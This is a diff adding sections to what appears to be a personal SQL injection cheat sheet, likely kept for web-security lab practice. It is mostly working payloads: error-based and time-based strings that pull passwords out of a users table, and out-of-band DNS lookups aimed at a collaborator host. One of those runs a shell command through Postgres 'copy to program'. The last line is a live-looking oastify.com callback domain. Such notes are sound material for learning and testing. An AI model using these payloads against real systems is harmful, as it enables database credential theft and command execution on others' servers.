@@ -152,9 +152,53 @@ For different DBs:
 * Postgres: `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
 * MySQL: `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`
 
+#### Visible error-base SQLo
+Sometimes DB throws some additional info in error like `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`  
+To exploit this, we can use CAST:  
+`CAST((SELECT example_column FROM example_table) AS int)`
+Example:
+```
+' AND 1=CAST((SELECT password FROM users LIMIT 1) as int) --
+```
+This will throw an error:  
+`ERROR: invalid input syntax for type integer: "jec5qqzsfktcvtv2bewn"`  
+And from ehre we get our password
+
+#### Time-Based SQLi
+For MSSQL:
+```
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--     This will trigger delay       
+```
+Example: `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
+
+* Oracle: ` dbms_pipe.receive_message(('a'),10)`
+```
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+```
+* PostgreSQL: `SELECT pg_sleep(10)`
+```
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+' || pg_sleep(10)
+'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END --           %3B stays for ;
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+* MySQL: `SELECT SLEEP(10)`
+```
+SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+```
 ### Second-order SQLi
 SQLi which is stored inside server/database and executed later with another HTTP request. Also called stored SQLi  
 
+### OAST SQLi
+We can trigger DB to perform DNS lookup  
+It's possible to sue Burp collaborator for such exploits
+* MSSQL: `'; exec master..xp_dirtree '//<url>/a'`
+* Oracle `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`. This vuln is patched, but it's possible to exploit it on unpatched systems
+* Oracle: `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`. Works on patched systems, but needs priv esc
+* Postgres: `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`
+* MySQL: `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` .WOrks on Windows only
+* MySQL: (maybe it's part of previous payload, idk) `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`
 
 
-
+bkz3x3qa7tqcxi6d6wkksjd25tbkzbn0.oastify.com
